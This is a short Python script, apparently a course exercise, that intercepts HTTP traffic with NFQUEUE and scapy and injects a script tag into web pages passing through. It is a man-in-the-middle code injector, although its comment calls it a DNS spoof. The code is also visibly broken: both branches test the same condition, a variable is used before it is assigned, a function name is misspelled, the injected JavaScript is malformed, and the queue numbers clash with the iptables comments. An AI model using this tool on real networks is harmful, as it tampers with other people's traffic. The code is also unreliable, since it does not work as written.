#!/usr/bin/env python
#basic code of DNS spoof
#iptables -I OUTPUT -j NFQUEUE --queue-num 0
#iptables -I INPUT -j NFQUEUE --queue-num 0
#at last execute ---- iptable --flush

#code helps to make other website un-used

import netfilterqueue
import scapy.all as scapy
from scapy.layers import http
import re

def set_load(packet, load):
	packet[scapy.Raw].load = load
	del packet[scapy.IP].len
	del packet[scapy.IP].chksum
	del packet[scapy.TCP].chksum
	return packet

def process_packet(packet):
	scapy_packet = scapy.IP(packet.get_payload())
	if scapy_packet.haslayer(scapy.Raw):
		try:
			load = str(scapy_packet[scapy.Raw].load)
			if scapy_packet[scapy.TCP] == 80:
				print("[+] Request")
				load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)		#Error-1
				print(new_packet.show())

			elif scapy_packet[scapy.TCP] == 80:
				print("[+] Response")
				print(scapy_packet.show())
				injection_code = "<script>alert{'test'};</script>"
				load = load.replace("</body>", injection_code + "</body>")
				content_lenght_search = re.search("(?:Content-Length:\s)(\d*)", load)   		
				if content_lenght_search and "text/html" in load:
					content_length = content_lenght_search.group(1)
					new_content_length = int(content_length) + len(injection_code)
					load = load.replace(content_length, str(new_content_length))

			if load != scapy_packet[scapy.Raw].load:
				new_packet = set_load(scapy_packet, load)   #from replace-download lecture
				packet.set_payload(byte(new_packet))				#Error-2
		except UnicodeDecodeError:
			pass

	packet.accept()



queue = netfilterqueue.NetfilterQueue()
queue.bind(1, process_packet)  
queue.run()


